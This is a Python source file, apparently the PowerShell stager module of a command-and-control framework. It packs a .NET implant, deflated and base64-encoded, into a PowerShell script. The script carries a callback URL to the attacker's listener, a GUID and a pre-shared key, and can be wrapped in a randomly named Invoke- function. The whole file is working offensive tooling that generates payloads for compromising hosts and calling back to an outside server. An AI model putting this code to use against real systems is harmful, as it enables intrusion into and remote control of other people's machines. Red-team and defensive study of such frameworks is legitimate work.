import logging
import uuid
from core.utils import gen_random_string
from core.teamserver.stager import Stager
from core.teamserver.crypto import gen_stager_psk
from core.teamserver.utils import dotnet_deflate_and_encode


class STStager(Stager):
    def __init__(self):
        self.name = 'powershell'
        self.description = 'Stage via a PowerShell script'
        self.suggestions = ''
        self.extension = 'ps1'
        self.author = '@byt3bl33d3r'
        self.options = {
            'AsFunction': {
                'Description'   :   "Generate stager as a PowerShell function",
                'Required'      :   False,
                'Value'         :   True
            }
        }

    def generate(self, listener):
        with open('./core/teamserver/data/naga.exe', 'rb') as assembly:
            with open('core/teamserver/stagers/templates/posh.ps1') as template:
                template = template.read()

                c2_url = f"{listener.name}://{listener['BindIP']}:{listener['Port']}"
                guid = uuid.uuid4()
                psk = gen_stager_psk()

                if bool(self.options['AsFunction']['Value']) is True:
                    function_name = gen_random_string(6).upper()
                    template = f"""function Invoke-{function_name}
{{
    [CmdletBinding()]
    param (
        [Parameter(Mandatory=$true)][String]$Guid,
        [Parameter(Mandatory=$true)][String]$Psk,
        [Parameter(Mandatory=$true)][String]$Url
    )

    {template}
}}
Invoke-{function_name} -Guid {guid} -Psk {psk} -Url {c2_url}
"""
                else:
                    template = template.replace("$Url", f'{c2_url}')
                    template = template.replace("$Guid", f'{guid}')
                    template = template.replace("$Psk", f'{psk}')

                assembly = assembly.read()
                template = template.replace("BASE64_ENCODED_ASSEMBLY", dotnet_deflate_and_encode(assembly))
                template = template.replace("DATA_LENGTH", str(len(assembly)))
                return guid, psk, template
